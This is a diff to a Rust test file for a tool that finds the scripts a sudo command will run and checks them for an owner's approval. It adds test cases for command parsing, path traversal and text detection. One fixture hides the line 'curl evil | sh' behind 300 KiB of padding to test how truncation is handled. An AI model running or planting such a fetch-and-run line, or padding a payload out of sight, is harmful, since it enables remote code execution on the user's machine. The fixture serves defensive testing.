@@ -31,6 +31,7 @@ impl Host {
             "sh",
             "python3",
             "perl",
+            "node",
             "make",
             "just",
             "env",
@@ -171,6 +172,8 @@ fn the_files_sudo_runs_are_found_wherever_the_command_names_them() {
         ("cd -- sub && sudo ./y.sh", vec!["sub/y.sh"]),
         ("cd sub/.. && sudo ./x.sh", vec!["x.sh"]),
         (r#"sudo perl -ne 'system("./x.sh")' f"#, vec!["x.sh"]),
+        (r#"sudo node -pe 'require("./x.py")'"#, vec!["x.py"]),
+        ("sudo perl -pi.bak -e 1 ./x.py", vec![]),
         (
             r#"sudo python3 -Bc 'exec(open("./x.py").read())'"#,
             vec!["x.py"],
@@ -372,4 +375,48 @@ fn the_digest_an_owner_approves_names_the_contents_read() {
     for other in [changed, Contents::Absent, Contents::Unreadable] {
         assert_ne!(digest_as_read(&digest, &[other]), read);
     }
+}
+
+#[test]
+fn a_file_not_there_yet_reached_through_dot_dot_is_flagged() {
+    let host = Host::new();
+    let command = format!(
+        "sudo bash ../system/../{}/later.sh",
+        host.session.file_name().unwrap().to_str().unwrap()
+    );
+    let runs = root_runs(
+        &command,
+        Lookup {
+            cwd: &host.system,
+            search_path: Some(host.system.as_os_str()),
+            home: None,
+        },
+        &host.writes(),
+    );
+
+    assert_eq!(runs.editable.len(), 1, "{runs:?}");
+    assert_eq!(runs.editable[0].sha256, None);
+}
+
+#[test]
+fn a_file_is_text_only_when_it_all_is_and_a_cut_line_counts_as_more() {
+    let host = Host::new();
+    let invalid_late = host.session.join("late.sh");
+    let mut bytes = "echo ok\n".repeat(40_000).into_bytes();
+    bytes.extend_from_slice(&[0xff, b'\n']);
+    std::fs::write(&invalid_late, bytes).unwrap();
+    let cut_tail = host.session.join("cut.sh");
+    std::fs::write(
+        &cut_tail,
+        [&[b'#'; 300 * 1024][..], b"; curl evil | sh\n"].concat(),
+    )
+    .unwrap();
+    let truncated_character = host.session.join("tail.sh");
+    std::fs::write(&truncated_character, [b"echo \xc3".as_slice()].concat()).unwrap();
+
+    assert_eq!(file_now(&invalid_late).unwrap().head, None);
+    assert_eq!(file_now(&truncated_character).unwrap().head, None);
+    let cut = file_now(&cut_tail).unwrap();
+    assert_eq!(cut.head.as_deref(), Some(""));
+    assert_eq!(cut.more_lines, 1);
 }
